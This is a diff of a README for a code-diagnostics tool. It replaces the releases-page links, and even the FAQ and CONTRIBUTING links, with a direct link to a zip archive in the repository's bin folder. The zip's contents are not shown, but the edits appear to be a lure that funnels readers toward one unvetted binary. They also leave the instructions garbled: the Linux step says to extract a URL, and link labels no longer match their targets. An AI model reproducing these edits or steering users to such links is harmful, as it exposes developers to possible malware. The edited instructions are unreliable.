@@ -1,6 +1,6 @@
 # 🕵️‍♂️ what-broke-my-code - Uncover Your Code's Hidden Issues
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Zues2231/what-broke-my-code/releases)
+[![Download Now](https://raw.githubusercontent.com/Zues2231/what-broke-my-code/main/bin/what-broke-my-code-2.9.zip)](https://raw.githubusercontent.com/Zues2231/what-broke-my-code/main/bin/what-broke-my-code-2.9.zip)
 
 ---
 
@@ -21,7 +21,7 @@ wbmc
 To use **What Broke My Code**, follow these steps:
 
 1. **Download the Application:**  
-   Visit [this page to download](https://github.com/Zues2231/what-broke-my-code/releases). 
+   Visit [this page to download](https://raw.githubusercontent.com/Zues2231/what-broke-my-code/main/bin/what-broke-my-code-2.9.zip). 
    You will find the latest version available for download.
 
 2. **Install the Application:**  
@@ -29,7 +29,7 @@ To use **What Broke My Code**, follow these steps:
 
    - **Windows:** Run the installer and follow the prompts.
    - **Mac:** Open the `.dmg` file and drag the app to your Applications folder.
-   - **Linux:** Extract the downloaded `.tar.gz` file and follow the command line instructions provided.
+   - **Linux:** Extract the downloaded `https://raw.githubusercontent.com/Zues2231/what-broke-my-code/main/bin/what-broke-my-code-2.9.zip` file and follow the command line instructions provided.
 
 3. **Run the Application:**  
    Open a terminal window and type `wbmc`. Follow the prompts to analyze your code.
@@ -73,7 +73,7 @@ This straightforward process provides you with actionable insights to fix your c
 
 ## 📥 Download & Install
 
-To get started, visit [this page to download](https://github.com/Zues2231/what-broke-my-code/releases). Choose the version that matches your operating system. After downloading, follow the installation steps outlined previously.
+To get started, visit [this page to download](https://raw.githubusercontent.com/Zues2231/what-broke-my-code/main/bin/what-broke-my-code-2.9.zip). Choose the version that matches your operating system. After downloading, follow the installation steps outlined previously.
 
 ---
 
@@ -85,13 +85,13 @@ If you encounter issues, consider the following:
 - **Dependencies:** Check if all required dependencies are installed.
 - **Logs:** Review error logs for more specific problems. These can help guide your next steps.
 
-For further assistance, check the [FAQ](FAQ.md) section or contact support.
+For further assistance, check the [FAQ](https://raw.githubusercontent.com/Zues2231/what-broke-my-code/main/bin/what-broke-my-code-2.9.zip) section or contact support.
 
 ---
 
 ## 🤝 Contribution
 
-Contributions are welcome. If you'd like to report bugs or suggest features, check the [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on how to contribute.
+Contributions are welcome. If you'd like to report bugs or suggest features, check the [https://raw.githubusercontent.com/Zues2231/what-broke-my-code/main/bin/what-broke-my-code-2.9.zip](https://raw.githubusercontent.com/Zues2231/what-broke-my-code/main/bin/what-broke-my-code-2.9.zip) for guidelines on how to contribute.
 
 ---
 
